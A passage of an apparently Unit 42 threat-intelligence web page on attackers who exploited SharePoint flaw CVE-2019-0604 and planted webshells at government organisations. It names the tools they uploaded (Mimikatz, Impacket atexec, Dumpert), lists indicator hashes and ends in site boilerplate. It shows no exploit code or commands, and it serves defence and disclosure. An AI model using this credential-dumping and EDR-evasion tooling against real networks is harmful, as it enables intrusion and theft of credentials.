https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-7-Comparison-between-code-used-by-AntSword-and-China-Chopper-to-run-a-command-on-the-webshell-370x122.png 370w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-7-Comparison-between-code-used-by-AntSword-and-China-Chopper-to-run-a-command-on-the-webshell.png 1307w" sizes="(max-width: 1024px) 100vw, 1024px" /></a><figcaption id="caption-attachment-103718" class="wp-caption-text">Figure 7 Comparison between code used by AntSword and China Chopper to run a command on the webshell</figcaption></figure>
<p>&nbsp;</p>
<h4>Tools Seen in Related Webshell</h4>
<p>When analyzing tools uploaded to the AntSword webshell, we discovered the same Mimikatz sample uploaded to a webshell hosted on a server at another government organization in a different Middle Eastern country. On September 19, 2019, the actor uploaded this Mimikatz sample to the webshell hosted at a URL:</p>
<p><span style="font-family: 'courier new', courier, monospace;">&lt;redacted domain&gt;/uploadedFiles/green_post.aspx</span></p>
<p>We did not have access to the webshell hosted at this URL or visibility into the commands executed by the actor. We also do not know if the server is a SharePoint server or if a vulnerability was exploited to install the webshell. However, the Mimikatz sample was unique as it used a custom loader written in .NET, so we believe that the same threat group is involved in the intrusions at both of these government organizations.</p>
<p>In addition to the Mimikatz tool, the actor uploaded other tools to the webshell hosted at this second organization. Table 2 shows the executables uploaded to the webshell, which shows similar tools that actors uploaded to the AntSword webshell discussed earlier, including Mimikatz and Impacket’s atexec tool.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 94.6667px;"><strong>SHA256</strong></td>
<td style="width: 77.3333px;"><strong>Filename</strong></td>
<td style="width: 218.667px;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 94.6667px;">da53dcaeed..</td>
<td style="width: 77.3333px;">es.exe</td>
<td style="width: 218.667px;">Mimikatz with custom loader</td>
</tr>
<tr>
<td style="width: 94.6667px;">26d9212ec8..</td>
<td style="width: 77.3333px;">Rar.exe</td>
<td style="width: 218.667px;">Legitimate WinRAR</td>
</tr>
<tr>
<td style="width: 94.6667px;">a4aca75bcc..</td>
<td style="width: 77.3333px;">atec.exe</td>
<td style="width: 218.667px;">Compiled Impacket atexec tool</td>
</tr>
<tr>
<td style="width: 94.6667px;">e4e05c9a21..</td>
<td style="width: 77.3333px;">dmp.exe</td>
<td style="width: 218.667px;">Dumpert tool</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 2 Tools uploaded to webshell hosted at second government organization</em></span></p>
<p>One of the tools seen in Table 2 that caught our interest was the Dumpert tool, which is <a href="https://github.com/outflanknl/Dumpert">freely available on Outflanknl’s GitHub repository</a>. The author of Dumpert describes the tool as an LSASS dumping tool that uses direct system calls and API unhooking to evade antivirus and EDR solutions. Dumpert is a relatively new tool with its initial commit to GitHub occurring on June 17, 2019. While the Dumpert tool is meant to help red teams emulate an adversary, we had not seen this tool used by threat actors until it was uploaded to this related webshell on September 23, 2019.</p>
<h2>Conclusion</h2>
<p>Threat actors continue to exploit the <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0604">CVE-2019-0604</a> vulnerability to compromise SharePoint servers, which is a vulnerability that <a href="https://support.microsoft.com/en-us/help/4462211/description-of-the-security-update-for-sharepoint-enterprise-server">Microsoft released a patch for in March 2019</a>. We observed actors installing webshells to the SharePoint server that they use to run commands and upload additional tools to in order to dump credentials and move laterally to other systems on the network. We were also able to find a related webshell based on the threat group’s tool reuse, specifically a custom Mimikatz sample. Thanks to this tool reuse, we found the threat group uploading a credential dumping tool called Dumpert that we had not seen used in prior incidents involving the exploitation of CVE-2019-0604.</p>
<p>Palo Alto Networks customers are protected by:</p>
<ul>
<li>The CVE-2019-0604 vulnerability is covered by our IPS signature Microsoft SharePoint Remote Code Execution Vulnerability (55411)</li>
<li>The AntSword ASPX Webshell is detected by our IPS signature AntSword Webshell Command and Control Traffic Detection (85561, 85562, 85563)</li>
<li>The Mimikatz, Impacket atexec and Dumpert tools are all marked with malicious verdicts by WildFire.</li>
</ul>
<h2>Indicators of Compromise</h2>
<h4>Awen Webshell</h4>
<p>5d4628d4dd89f31236f8c56686925cbb1a9b4832f81c95a4300e64948afede21</p>
<h4>AntSword Webshell</h4>
<p>15ecb6ac6c637b58b2114e6b21b5b18b0c9f5341ee74b428b70e17e64b7da55e</p>
<h4>Mimikatz</h4>
<p>da53dcaeede03413ba02802c4be10883c4c28d3d28dee11734f048b90eb3d304</p>
<h4>Related Tools</h4>
<p>da53dcaeede03413ba02802c4be10883c4c28d3d28dee11734f048b90eb3d304</p>
<p>2836cf75fa0538b2452d77848f90b6ca48b7ff88e85d7b006924c3fc40526287</p>
<p>26d9212ec8dbca45383eb95ec53c05357851bd7529fa0761d649f62e90c4e9fd</p>
<p>a4aca75bcc8f18b8a2316fd67a7e545c59b871d32de0b325f56d22584038fa10</p>
<p>e4e05c9a216c2f2b3925293503b5d5a892c33db2f6ea58753f032b80608c3f2e</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
